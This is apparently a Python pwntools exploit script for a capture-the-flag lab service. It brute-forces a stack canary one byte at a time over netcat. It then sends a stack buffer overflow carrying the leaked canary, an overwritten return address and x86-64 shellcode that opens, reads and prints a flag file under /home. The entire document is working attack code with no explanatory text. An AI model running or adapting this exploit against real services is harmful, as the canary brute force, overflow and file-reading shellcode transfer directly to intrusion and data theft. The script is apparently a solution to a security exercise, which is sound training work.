from pwn import *
import os, time

context.arch = 'amd64'
context.os = 'linux'

p = b'\x90'* 39
canary = b'\x00'
for i in range(1, 8):
    for j in range(256):
        cur = j.to_bytes(1, "little")
        snd = process("nc set_05_miningx_chen4062_1 1337", shell=True)
        snd.sendline((i + 41).to_bytes(4, 'little'))
        snd.clean()
        snd.send(p + canary + cur)
        time.sleep(0.01)
        canary_row = snd.clean()
        snd.close()
        if b'DING' in canary_row:
            canary += cur
            break

p = p + canary + b'a'*8 + b'\xdf\x0a\x40\x00\x00\x00\x00\x00' + asm('xor rax, rax;\nxor rbp, rbp;\npush rax;\nmov rbp, 0x7478742e67616c66;\npush rbp;\nmov rbp, 0x2f32306b7361742f;\npush rbp;\nmov rbp, 0x656d6f682f2f2f2f;\n push rbp;\n mov rdi, rsp;\n mov rsi, 0x0;\n mov rdx, 0x400;\n mov rax, 0x2; \nsyscall;\nmov rdi, 0x5;\n mov rax, 0x0;\n mov rdx, 0x30;\n mov rsi, rsp;\nsyscall;\n mov rsi, rsp;\n mov rdi, 0x4;\n mov rdx, 0x30;\n mov rax, 0x1;\n syscall;\n')
snd = process("nc set_05_miningx_chen4062_1 1337", shell=True)
snd.sendline((len(p) + 1).to_bytes(4, 'little'))
time.sleep(0.03)
snd.clean()
snd.send(p)
time.sleep(0.03)
canary_row = snd.clean()
print(canary_row)
